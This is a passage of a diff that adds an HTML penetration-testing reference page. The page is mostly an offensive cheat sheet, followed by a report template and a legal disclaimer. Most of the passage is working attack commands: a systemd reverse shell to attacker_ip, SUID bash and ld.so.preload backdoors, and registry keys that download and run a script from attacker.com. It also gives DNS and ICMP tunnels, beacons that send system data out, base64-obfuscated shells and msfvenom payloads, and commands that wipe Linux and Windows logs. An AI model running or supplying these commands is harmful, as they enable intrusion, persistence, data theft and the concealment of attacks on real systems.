+cat > /etc/systemd/system/update-service.service << EOF
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable update-service.service
+
+<span class="command"># Init script persistence</span>
+echo '#!/bin/bash\nchmod +s /bin/bash' > /etc/init.d/persistence
+chmod +x /etc/init.d/persistence
+update-rc.d persistence defaults
+
+<span class="command"># Library hijacking</span>
+echo 'system("/bin/bash -p");' > /tmp/libcustom.c
+gcc -shared -fPIC /tmp/libcustom.c -o /usr/lib/libcustom.so
+echo "/usr/lib/libcustom.so" >> /etc/ld.so.preload
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">🪟 Windows Persistence Mastery</div>
+                    <div class="code-block">
+<span class="command"># Registry Run Keys</span>
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\""
+
+<span class="command"># WMI Event Subscription</span>
+wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter48", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+
+<span class="command"># Scheduled Task Persistence</span>
+schtasks /create /tn "System Security Update" /tr "powershell.exe -WindowStyle Hidden -exec bypass -c \"[payload]\"" /sc onstart /ru system
+
+<span class="command"># DLL Hijacking</span>
+copy malicious.dll "C:\Program Files\Common Files\System\Ole DB\oledb32.dll"
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">🌐 Network-Based Persistence</div>
+                    <div class="code-block">
+<span class="command"># DNS Tunneling Backdoor</span>
+python3 dnscat2.py --domain attacker.com
+python3 dns-shell.py -d attacker.com
+
+<span class="command"># ICMP Tunneling</span>
+python3 icmptunnel.py -s attacker_ip
+python3 pingback.py --server attacker_ip
+
+<span class="command"># HTTP/HTTPS Beaconing</span>
+curl -X POST -d "data=$(whoami)" http://attacker.com/beacon.php
+powershell -c "Invoke-WebRequest -Uri 'http://attacker.com/beacon' -Method POST -Body (Get-ComputerInfo | ConvertTo-Json)"
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="stealth-techniques" class="section">
+            <h2>👤 Stealth and Evasion Techniques</h2>
+            
+            <div class="advanced-technique">
+                <div class="technique-title">🥷 Advanced Evasion Methods</div>
+                
+                <div class="workflow-section">
+                    <div class="step">
+                        <div class="step-header">
+                            <div class="step-number">1</div>
+                            <div class="step-title">Anti-Detection Scanning</div>
+                        </div>
+                        <div class="code-block">
+<span class="command"># Slow and stealthy scanning</span>
+nmap -sS -T1 -f --source-port 53 --data-length 200 target_ip
+masscan -p1-65535 target_ip --max-rate 100 --source-port 53
+
+<span class="command"># Decoy scanning</span>
+nmap -sS -D decoy1,decoy2,decoy3,ME target_ip
+nmap -sS -D RND:10 target_ip
+
+<span class="command"># Fragmentation and evasion</span>
+nmap -sS -f -mtu 24 target_ip
+nmap --script-args=unsafe=1 --script smb-vuln-ms17-010 target_ip
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-header">
+                            <div class="step-number">2</div>
+                            <div class="step-title">Payload Obfuscation</div>
+                        </div>
+                        <div class="code-block">
+<span class="command"># Encoded payloads</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded_payload.exe
+
+<span class="command"># PowerShell obfuscation</span>
+powershell -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9ACcAVABsAHMAMQAyACcA
+
+<span class="command"># Bash obfuscation</span>
+echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" | base64
+bash -c "$(echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=' | base64 -d)"
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-header">
+                            <div class="step-number">3</div>
+                            <div class="step-title">Log Evasion and Cleanup</div>
+                        </div>
+                        <div class="code-block">
+<span class="command"># Linux log cleanup</span>
+history -c && history -w
+rm ~/.bash_history
+echo "" > /var/log/auth.log
+echo "" > /var/log/apache2/access.log
+
+<span class="command"># Windows event log cleanup</span>
+wevtutil cl Application
+wevtutil cl System
+wevtutil cl Security
+for /f %i in ('wevtutil el') do wevtutil cl "%i"
+
+<span class="command"># Process hiding</span>
+<span class="comment"># Linux process renaming</span>
+cp /bin/bash /tmp/[kthread]
+/tmp/[kthread] -c "nc -e /bin/bash attacker_ip 4444"
+
+<span class="comment"># Windows process hollowing</span>
+powershell -c "Start-Process notepad; $proc = Get-Process notepad; [payload_injection_code]"
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="reporting" class="section">
+            <h2>📊 Professional Penetration Testing Reports</h2>
+            
+            <div class="workflow-section">
+                <h3>📋 Executive Summary Template</h3>
+                <div class="code-block">
+                    <div class="code-header">🎯 Executive Summary Structure</div>
+<strong>PENETRATION TEST EXECUTIVE SUMMARY</strong>
+
+<strong>Client:</strong> [Company Name]
+<strong>Test Period:</strong> [Start Date] - [End Date]
+<strong>Tester:</strong> [Your Name/Team]
+<strong>Scope:</strong> [IP Ranges, Domains, Applications]
+
+<strong>OVERALL RISK RATING: [CRITICAL/HIGH/MEDIUM/LOW]</strong>
+
+<strong>Key Findings:</strong>
+• [Number] Critical vulnerabilities identified
+• [Number] High-risk issues requiring immediate attention
+• [Number] Medium-risk vulnerabilities
+• [Number] Low-risk informational findings
+
+<strong>Critical Issues Summary:</strong>
+1. [Vulnerability Name] - Complete system compromise possible
+2. [Vulnerability Name] - Sensitive data exposure
+3. [Vulnerability Name] - Network-wide lateral movement
+
+<strong>Business Impact:</strong>
+• Financial: Potential data breach costs estimated at $[Amount]
+• Reputational: Customer trust and regulatory compliance at risk
+• Operational: Critical systems vulnerable to disruption
+
+<strong>Immediate Actions Required:</strong>
+1. Patch critical vulnerabilities within 24-48 hours
+2. Implement network segmentation
+3. Review and update access controls
+4. Deploy monitoring solutions
+                </div>
+            </div>
+
+            <div class="completion-checklist">
+                <div class="checklist-title">📋 Professional Report Components</div>
+                <div class="checklist-item">Executive summary with risk ratings</div>
+                <div class="checklist-item">Detailed technical findings</div>
+                <div class="checklist-item">Proof-of-concept demonstrations</div>
+                <div class="checklist-item">Risk assessment matrix</div>
+                <div class="checklist-item">Remediation recommendations</div>
+                <div class="checklist-item">Attack chain diagrams</div>
+                <div class="checklist-item">Screenshots and evidence</div>
+                <div class="checklist-item">Compliance mapping (if applicable)</div>
+                <div class="checklist-item">Retest recommendations</div>
+                <div class="checklist-item">Appendices with technical details</div>
+            </div>
+        </section>
+
+        <div class="warning-box">
+            <div class="warning-title">⚠️ CRITICAL LEGAL AND ETHICAL REMINDERS</div>
+            <p><strong>This documentation is exclusively for:</strong></p>
+            <ul>
+                <li>Authorized penetration testing engagements with written permission</li>
+                <li>Educational cybersecurity training in controlled lab environments</li>
+                <li>Personal skill development on owned systems and approved platforms</li>
+                <li>Red team exercises within organizational security programs</li>
+            </ul>
+            <p><strong>Unauthorized use of these techniques may violate:</strong></p>
+            <ul>
+                <li>Computer Fraud and Abuse Act (CFAA)</li>
+                <li>Digital Millennium Copyright Act (DMCA)</li>
+                <li>Local and international cybercrime laws</li>
+                <li>Professional ethical standards</li>
+            </ul>
+            <p><strong>Always ensure you have explicit written authorization before conducting any security testing activities.</strong></p>
+        </div>
+
+        <footer style="text-align: center; padding: 30px; color: #888; background: #1a1a2e; border-radius: 10px; margin-top: 30px;">
+            <p>&copy; 2024 SPARM Enhanced Documentation - Authorized Security Testing Only</p>
+            <p><strong>Remember:</strong> With great power comes great responsibility. Use these techniques ethically, legally, and responsibly.</p>
+            <p><em>"The best defense is understanding the offense - but always within legal and ethical boundaries."</em></p>
+        </footer>
+    </div>
+
+    <script>
+        function showTab(tabName) {
+            // Hide all tab contents
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(content => content.classList.remove('active'));
+            
+            // Remove active class from all buttons
+            const buttons = document.querySelectorAll('.tab-button');
+            buttons.forEach(button => button.classList.remove('active'));
+            
+            // Show selected tab content
+            document.getElementById(tabName).classList.add('active');
+            
+            // Add active class to clicked button
+            event.target.classList.add('active');
+        }
+    </script>
+</body>
+</html>
